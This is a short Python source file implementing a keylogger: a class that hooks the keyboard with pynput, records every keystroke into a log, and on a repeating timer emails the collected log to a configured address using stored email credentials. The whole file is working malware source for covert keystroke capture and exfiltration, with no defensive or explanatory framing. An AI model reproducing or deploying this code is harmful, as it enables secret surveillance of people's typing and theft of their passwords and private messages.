from shared import send_email
from pynput import keyboard
import time
import threading
import platform
import os


class Keylogger:
    def __init__(self, time_in_seconds, email_address, email_password):
        self.log = f"[+]Keylogger started on {os.name}, {platform.system()}"
        self.time_to_send_mail = time_in_seconds
        self.email_address = email_address
        self.email_password = email_password

    def on_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if str(key) == "Key.space":
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.set_log(current_key)

    # Corre en otro hilo, diferente al listener
    def report(self):
        if self.log != "":
            send_email(self.email_address, self.email_password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.time_to_send_mail, self.report)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        with keyboard_listener:
            try:
                self.report()
                keyboard_listener.join()
            except KeyboardInterrupt:
                print("[-]Bye...")

    def set_log(self, string):
        self.log += string
